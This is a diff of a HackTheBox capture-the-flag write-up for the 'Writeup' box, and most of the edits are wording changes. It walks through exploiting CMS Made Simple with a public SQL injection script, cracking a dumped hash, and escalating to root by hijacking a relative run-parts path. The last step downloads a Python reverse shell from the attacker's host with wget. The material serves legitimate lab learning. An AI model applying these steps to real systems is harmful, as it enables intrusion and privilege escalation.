@@ -2,8 +2,7 @@ This is my first writeup for any of the boxes I've done on HackTheBox and, fitti
 
 ![writeup info](Writeup.JPG)
 
-The box has a vulnerable version of CMS Made Simple installed on it and a recurring command to run run-parts 
-has a relative path specified which allows the user to create their own executable that will be executed when the command triggers.
+The box has a vulnerable version of CMS Made Simple installed on it. Once on the box, it has a recurring command to run run-parts, which has a relative path specified that allows the user to create their own executable that will be run when the command triggers.
 Both of these together allow the user to gain root access and retrieve the flag.
 
 Let's get to it with some enumeration using nmap:
@@ -57,8 +56,8 @@ Upon opening 10.10.10.138 in a browser, we are greeted with this message:
 ########################################################################
 ```
 
-So this site will probably ban us for a bit if we scan too fast. Might as well check some standard stuff first, it is supposed to be an easy box after all.
-Let's check robots.txt first. There is one disallowed url:
+So this site will probably ban us for a bit if we scan too fast. We might as well check some standard enumeration targets first; it is supposed to be an "easy" box after all.
+Let's check robots.txt. There is one disallowed url:
 ```
 #              __
 #      _(\    |@@|
@@ -75,9 +74,9 @@ User-agent: *
 Disallow: /writeup/
 ```
 
-Checking writeup we see a homepage that lists multiple writeups that are all accessed with index.php?page=x
-Maybe there's some php file inclusion vuln or injection available. Using Wappalyzer to check used technologies, it says that the website appears to be using CMS Made Simple.
-Let's see if there's some exploits available for this.
+Upon checking the writeup directory we see a homepage that lists multiple writeups that are all accessed with index.php?page=x.
+This indicates there could be some php file inclusion vuln or injection available. Using Wappalyzer to check used technologies, it lists that the website appears to be using CMS Made Simple.
+Let's see if there are some exploits available for it.
 
 ```
 root@kali:~/Documents/htb/boxes/writeup# searchsploit cms made simple 
@@ -90,9 +89,9 @@ root@kali:~/Documents/htb/boxes/writeup# searchsploit cms made simple
 CMS Made Simple < 2.2.10 - SQL Injecti | exploits/php/webapps/46635.py
 ...
 ```
-Here's one that mentions SQL Injection, seems like a good choice for when we have an index.php loading page.
+Here's one that mentions SQL Injection. This seems like a good choice for when we have an index.php loading page.
 
-Let's copy the python file to the current directory and check it out. It tries to dump salts usernames emails and passwords then attempt to crack them. 
+Let's copy the python file to the current directory and check it out. It tries to dump salts, usernames, emails, and passwords, then attempt to crack them. 
 Run the command:
 ```
 python 46635.py -u http://10.10.10.138/writeup/
@@ -105,7 +104,7 @@ which gives the following output after changing TIME to 1 inside the script.
 <font color="#8AE234"><b>[+] Password found: 62def4866937f08cc13bab43bb14e6f7</b></font>
 </pre>
 
-Personally I decided to yank out the password cracking portion so I could rerun it without waiting on the exploit if it happened to fail.
+Personally, I decided to yank out the password cracking portion so I could rerun it without waiting on the exploit if it happened to fail.
 Here's the code:
 ```python
 import hashlib
@@ -137,7 +136,7 @@ Try to log in through ssh with these credentials and we have user.txt
 jkr@writeup:~$ wc user.txt 
  1  1 33 user.txt
 ```
-Running a 64bit version of pspy we see one of the commands being run as root, seemingly when people log in with ssh, is the following:
+Running a 64bit version of pspy we see one of the commands being run as root (seemingly when people log in with ssh) is the following:
 ```
 sh -c /usr/bin/env -i PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin run-parts --lsbsysinit /etc/update-motd.d > /run/motd.dynamic.new  
 ```
@@ -159,10 +158,10 @@ drwxrwsr-x  2 root staff  4096 Apr 19 04:11 <font color="#729FCF"><b>src</b></fo
 jkr@writeup:~$ groups
 jkr cdrom floppy audio dip video plugdev staff netdev
 </pre>
-So our user has no read permissions to /usr/local/bin but we have write permissions so we can just drop a script from our host machine in and have that be run first because of its order in the PATH (since other users were on the box /usr/local/bin was changed less often than sbin so I decided to go through there).
+So our user has no read permissions to /usr/local/bin, but we have write permissions. Due to this we can just drop a script from our host machine in and have that be run first because of its order in the PATH (since other users were on the box /usr/local/bin was changed less often than sbin so I decided to go through there).
 
-We need a script to run instead of run-parts, thankfully I already have a python reverse shell on my attacking machine and I rename that to run-parts
-and start up a web server to transfer it. Grab it and save it to one of the first folders listed in the PATH. The code is listed at the bottom of the next block.
+We need a script to run instead of run-parts. Thankfully I already have a python reverse shell on my attacking machine and I rename that to run-parts.
+To transfer it, I start up a web server. Grab it and save it to one of the first folders listed in the PATH. The code is listed at the bottom of the next block.
 <pre>jkr@writeup:/usr/local/bin$ wget 10.10.15.8:8000/run-parts                     
 --2019-10-11 22:17:17--  http://10.10.15.8:8000/run-parts                      
 Connecting to 10.10.15.8:8000... connected.                                    
